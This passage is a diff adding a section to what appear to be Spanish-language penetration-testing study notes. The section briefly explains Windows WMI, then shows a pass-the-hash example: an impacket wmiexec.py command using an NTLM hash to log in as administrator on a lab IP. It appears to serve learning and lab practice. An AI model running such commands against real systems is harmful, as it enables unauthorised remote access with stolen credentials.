@@ -44,3 +44,23 @@ exploit
 ![[Pasted image 20250303093542.png]]
 
 
+## Con WMIExec
+
+WMI (Windows Management Instrumentation) es un framework de microsoft para manejar y monitorizar sistemas basados en windows.
+
+Permite a los administradores realizar varias tareas como conseguir información, lanzar scripts y controlar operaciones del sistema. Utiliza el puerto 135 para establecer conexión.
+
+Ejemplo de uso:
+
+Tenemos la ip víctima -> 10.4.25.201
+
+Y el NTLM hash 
+
+```
+wmiexec.py -hashes 00000000000000000000000000000000:5c4d59391f656d5958dab124ffeabc20 administrator@10.4.25.201
+```
+
+![[Pasted image 20250304091554.png]]
+
+
+
